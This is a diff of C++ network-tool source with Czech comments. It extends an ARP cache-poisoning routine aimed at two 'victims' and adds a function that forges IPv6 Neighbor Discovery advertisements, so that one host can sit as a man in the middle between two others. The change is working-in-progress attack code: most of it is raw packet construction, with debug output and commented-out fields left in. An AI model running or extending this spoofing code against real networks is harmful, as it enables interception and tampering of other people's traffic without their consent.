@@ -239,9 +239,9 @@ void openFile(char* file)
  */
 std::string createAddress(u_char * input)
 {
-	char tmp[3];
+	char tmp[4];
 	std::string output;
-	
+	printIP(input);
 	for(int i =0; i < 3; i++){
 		sprintf(&tmp[0], "%d", input[i]);
 		output += tmp;
@@ -249,7 +249,6 @@ std::string createAddress(u_char * input)
 	}
 	sprintf(&tmp[0], "%d", input[3]);
 	output += tmp;
-
 	return output;
 }
 
@@ -354,12 +353,16 @@ void scanIPv4(INTERFACE_INFO* intInfo)
 	//vytvoření cílové adresy a portu
 	dst_address.sin_port = htons(520);
 	dst_address.sin_family = AF_INET;
+
+	printIP(intInfo->interfaceAdd);
+	printIP(intInfo->networkAddress);
 	
 	inet_pton(AF_INET,createAddress(intInfo->interfaceAdd).c_str(),&src_address.sin_addr);
+	cerr<<"test arp4"<<endl;
 	inet_pton(AF_INET,createAddress(intInfo->networkAddress).c_str(),&dst_address.sin_addr);
 	
 	dst_ip = ntohl(dst_address.sin_addr.s_addr);
-	
+		
 	// Vytvoření socketu.
 	if ((sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
 		perror ("Socket() chyba při získání socketu pro ioctl()!");
@@ -695,7 +698,7 @@ void printIP(u_char * ip)
  * @param ip1 - IP adresa 1. oběti
  * @param ip2 - IP adresa 2. oběti
  */
-void poisonARP(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, char* ip1, char* ip2)
+void poisonVictims(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, char* ip1, char* ip2, bool arp)
 {
 	int sockfd;
 	struct sockaddr_ll device;
@@ -734,10 +737,23 @@ void poisonARP(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, char* 
 			perror ("socket() failed ");
 			exit (EXIT_FAILURE);
 		}
-		// Zasílání paketů oběma obětem
-		sendPacketARP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device);
-		sendPacketARP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device);
-		
+			
+		if(arp){
+			// Zasílání ARP paketů oběma obětem
+			sendPacketARP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device);
+			cerr<<"Odeslán první ARP"<<endl;
+			sendPacketARP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device);			
+			cerr<<"Odeslán první ARP"<<endl;
+		}
+		else{
+			// Zasílání NDP packetů
+			sendPacketNDP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device);
+			cerr<<"Odeslán první NDP"<<endl;
+//			sendPacketNDP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device);		
+			cerr<<"Odeslán první NDP"<<endl;
+		}
+
+				
 		close(sockfd);
 		usleep(time*1000000);
 	}
@@ -828,6 +844,136 @@ void sendPacketARP(u_char* srcMac,
 		perror ("sendto() failed");
 		exit (EXIT_FAILURE);
 	}
+}
+
+
+void sendPacketNDP(u_char* srcMac,
+				char* srcIp,
+				char* dstMac,
+				char* dstIp,
+				int socket,
+				struct sockaddr_ll device)
+{
+	// #####################################################################x
+	int datalen, frame_length;
+	struct ip6_hdr send_iphdr;
+	struct icmp6_hdr send_icmphdr;
+	uint8_t *data, *dst_mac, *send_ether_frame;
+
+	// Allocate memory for various arrays.
+	dst_mac = allocate_ustrmem (6);
+	data = allocate_ustrmem (IP_MAXPACKET);
+	send_ether_frame = allocate_ustrmem (IP_MAXPACKET);
+	
+	// Vyvoření MAC adresy oběti
+	createMacAdress(dst_mac,dstMac);
+
+	// IPv6 header
+//	fillIPv6hdr(intInfo, send_iphdr, datalen);
+	// IPv6 version (4 bits), Traffic class (8 bits), Flow label (20 bits)
+	send_iphdr.ip6_flow = htonl ((6 << 28) | (0 << 20) | 0);
+	// Hop limit (8 bits): default to maximum value
+	send_iphdr.ip6_hops = 255;
+	// Source IPv6 address (128 bits)
+	inet_pton (AF_INET6, srcIp, &(send_iphdr.ip6_src));
+	// Destination IPv6 address (128 bits)
+	inet_pton (AF_INET6, dstIp, &(send_iphdr.ip6_dst));
+
+	// Payload length (16 bits): ICMP header + ICMP data
+	send_iphdr.ip6_plen = htons (4 + 28);
+	send_iphdr.ip6_nxt = IPPROTO_ICMPV6;		
+	// ICMP header
+	// Message Type (8 bits): echo request
+	send_icmphdr.icmp6_type = ND_NEIGHBOR_ADVERT;  // Soci nastaveno
+	// Message Code (8 bits): echo request
+	send_icmphdr.icmp6_code = 0;
+	// Identifier (16 bits): usually pid of sending process - pick a number
+//	send_icmphdr.icmp6_id = htons (1000);
+	// Sequence Number (16 bits): starts at 0
+//	send_icmphdr.icmp6_seq = htons (0);
+	
+	// R,S,O, res nastavení
+	send_icmphdr.icmp6_dataun.icmp6_un_data16[0] = 0x5000;
+	send_icmphdr.icmp6_dataun.icmp6_un_data16[1] = 0x0000;
+//	send_icmphdr.icmp6_dataun.icmp6_un_data16[2] = 0x00;
+//	send_icmphdr.icmp6_dataun.icmp6_un_data16[3] = 0x00;
+	// Zdrojová IP
+	inet_pton (AF_INET6, srcIp, &(send_icmphdr.icmp6_dataun.icmp6_un_data32));
+	// MAC adresa
+	send_icmphdr.icmp6_dataun.icmp6_un_data8[0] = 0x02;
+	send_icmphdr.icmp6_dataun.icmp6_un_data8[1] = 0x01;
+//	memcpy(send_icmphdr.icmp6_dataun.icmp6_un_data8+2,srcMac,6*sizeof(u_char));
+	
+	
+	// ICMP data
+	datalen = 28;
+//	data[0] = 0x50; // R a S option
+//	data[1] = 0x00; // O a res
+//	data[2] = 0x00; // O a res
+//	data[3] = 0x00; // O a res
+////	2a00:1028:9940:5eb6:92:9d31:7043:3baf
+//	// target adress
+//	data[4] = 0x2a;
+//	data[5] = 0x00;
+//	data[6] = 0x10;
+//	data[7] = 0x28;
+//	data[8] = 0x99;
+//	data[9] = 0x40;
+//	data[10] = 0x5e;
+//	data[11] = 0xb6;	
+//	data[12] = 0x92;
+//	data[13] = 0x00;
+//	data[14] = 0x9d;
+//	data[15] = 0x31;	
+//	data[16] = 0x70;
+//	data[17] = 0x43;
+//	data[18] = 0x3b;
+//	data[19] = 0xaf;
+//	
+//	data[20] = 0x02; // type
+//	data[21] = 0x01; // len
+//	// MAC
+//	data[22] = 0xf4;
+//	data[23] = 0xb7;
+//	data[24] = 0xe2;
+//	data[25] = 0x92;
+//	data[26] = 0x1c;
+//	data[27] = 0x41;	
+	
+	// ICMP header checksum (16 bits): set to 0 when calculating checksum
+	send_icmphdr.icmp6_cksum = 0;
+	send_icmphdr.icmp6_cksum = icmp6_checksum (send_iphdr, send_icmphdr, data, 0);	
+	
+	// Fill out ethernet frame header.
+	// Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (IP header + ICMP header + ICMP data)
+	frame_length = 6 + 6 + 2 + IP6_HDRLEN + 4 + datalen;
+	// Destination and Source MAC addresses
+	memcpy (send_ether_frame, dst_mac, 6 * sizeof (uint8_t));
+	memcpy (send_ether_frame + 6, srcMac, 6 * sizeof (uint8_t));
+
+	// Next is ethernet type code (ETH_P_IPV6 for IPv6).
+	// http://www.iana.org/assignments/ethernet-numbers
+	send_ether_frame[12] = ETH_P_IPV6 / 256;
+	send_ether_frame[13] = ETH_P_IPV6 % 256;
+
+	// Next is ethernet frame data (IPv6 header + ICMP header + ICMP data).
+	// IPv6 header
+	memcpy (send_ether_frame + ETH_HDRLEN, &send_iphdr, IP6_HDRLEN * sizeof (uint8_t));
+	// ICMP header
+	memcpy (send_ether_frame + ETH_HDRLEN + IP6_HDRLEN, &send_icmphdr, 4 * sizeof (uint8_t));
+	// ICMP data
+	memcpy (send_ether_frame + ETH_HDRLEN + IP6_HDRLEN + 4, data, datalen * sizeof (uint8_t));
+	
+
+		// Send ethernet frame to socket.
+	if (sendto (socket, send_ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
+		perror ("sendto() failed ");
+		exit (EXIT_FAILURE);
+	}		
+//	cerr<<"Odesláno"<<endl;
+	free(send_ether_frame);
+	free(dst_mac);
+	free(data);
 }
 
 //#################################################################################################################################
